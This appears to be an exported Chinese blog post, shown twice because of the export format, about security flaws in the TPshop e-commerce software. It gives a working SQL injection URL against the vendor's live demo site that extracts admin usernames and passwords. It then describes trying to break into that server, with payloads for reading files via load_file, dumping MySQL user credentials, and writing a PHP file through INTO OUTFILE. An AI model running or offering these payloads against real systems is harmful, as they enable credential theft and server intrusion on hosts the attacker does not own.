title=\"商城这股浪潮不是过去了好久了吗?为什么还会有这种程序的出现\"></a>商城这股浪潮不是过去了好久了吗?为什么还会有这种程序的出现</h3><a id=\"more\"></a> \n<p><strong>问题1</strong>  </p>\n<p>模版代码保存在根目录下的Template目录下,并且官网的demo也没有做出访问限制,就是说代码随便看……  </p>\n<p><strong>问题2</strong>  </p>\n<p>好多查询都是字符串拼接放入where里,导致全是注入点  </p>\n<p>顺带记录一下失败的查询:在搜索控制器中发现注入点,测试后发现不是直接输出,于是在上一个注入点中构造一个带有下一个注入语句的查询结果,结果是失败了,因为下一个查询是做比对用的,也没有直接输出  </p>\n<p>算了,已经不想再找问题了,全是问题  </p>\n<p>注入也终于成功了一次,注入点是文章id:  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://demo2.tp-shop.cn/index.php/Home/Article/detail/article_id/123456789 )</div><div class=\"line\">UNION ALL</div><div class=\"line\">SELECT `user_name`,2,`user_name`,</div><div class=\"line\">`password`,`user_name`,`user_name`,`user_name`,`user_name`,</div><div class=\"line\">`user_name`,`user_name`,`user_name`,`user_name`,`user_name`,</div><div class=\"line\">`user_name`,`user_name`,`user_name`, `user_name` FROM tp_admin</div><div class=\"line\">-- hack</div></pre></td></tr></table></figure>\n<p>感觉这个网站就算是给安全新手练手都觉得太简单了.  </p>\n<p><strong>后记:</strong><br>代码全都是漏洞,所以想着利用demo进去服务器看看<br>通过代码审计找到sql注入漏洞 然后根据注入试图提权,用了各种方法,发现用户不是root,没有写入与读取权限,失败  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">/*select 1,2,3,load_file(char(69,58,92,112)),5,6,7,8,9,10,11,12,13,14,15,16,17文件读取 十六进制或char(十进制)</div><div class=\"line\">/*select 1,2,3,user,password,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.user用户查看</div><div class=\"line\">#UNION </div><div class=\"line\">SELECT &apos;&lt;? echo 1; ?&gt;&apos;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 INTO OUTFILE &quot;xxxx/123.php&quot;文件写入 get传入url会删除&apos;后的代码 测试时是post</div></pre></td></tr></table></figure>","excerpt":"<h3 id=\"商城这股浪潮不是过去了好久了吗-为什么还会有这种程序的出现\"><a href=\"#商城这股浪潮不是过去了好久了吗-为什么还会有这种程序的出现\" class=\"headerlink\" title=\"商城这股浪潮不是过去了好久了吗?为什么还会有这种程序的出现\"></a>商城这股浪潮不是过去了好久了吗?为什么还会有这种程序的出现</h3>","more":"<p><strong>问题1</strong>  </p>\n<p>模版代码保存在根目录下的Template目录下,并且官网的demo也没有做出访问限制,就是说代码随便看……  </p>\n<p><strong>问题2</strong>  </p>\n<p>好多查询都是字符串拼接放入where里,导致全是注入点  </p>\n<p>顺带记录一下失败的查询:在搜索控制器中发现注入点,测试后发现不是直接输出,于是在上一个注入点中构造一个带有下一个注入语句的查询结果,结果是失败了,因为下一个查询是做比对用的,也没有直接输出  </p>\n<p>算了,已经不想再找问题了,全是问题  </p>\n<p>注入也终于成功了一次,注入点是文章id:  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://demo2.tp-shop.cn/index.php/Home/Article/detail/article_id/123456789 )</div><div class=\"line\">UNION ALL</div><div class=\"line\">SELECT `user_name`,2,`user_name`,</div><div class=\"line\">`password`,`user_name`,`user_name`,`user_name`,`user_name`,</div><div class=\"line\">`user_name`,`user_name`,`user_name`,`user_name`,`user_name`,</div><div class=\"line\">`user_name`,`user_name`,`user_name`, `user_name` FROM tp_admin</div><div class=\"line\">-- hack</div></pre></td></tr></table></figure>\n<p>感觉这个网站就算是给安全新手练手都觉得太简单了.  </p>\n<p><strong>后记:</strong><br>代码全都是漏洞,所以想着利用demo进去服务器看看<br>通过代码审计找到sql注入漏洞 然后根据注入试图提权,用了各种方法,发现用户不是root,没有写入与读取权限,失败  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">/*select 1,2,3,load_file(char(69,58,92,112)),5,6,7,8,9,10,11,12,13,14,15,16,17文件读取 十六进制或char(十进制)</div><div class=\"line\">/*select 1,2,3,user,password,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.user用户查看</div><div class=\"line\">#UNION </div><div class=\"line\">SELECT &apos;&lt;? echo 1; ?&gt;&apos;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 INTO OUTFILE &quot;xxxx/123.php&quot;文件写入 get传入url会删除&apos;后的代码 测试时是post</div></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}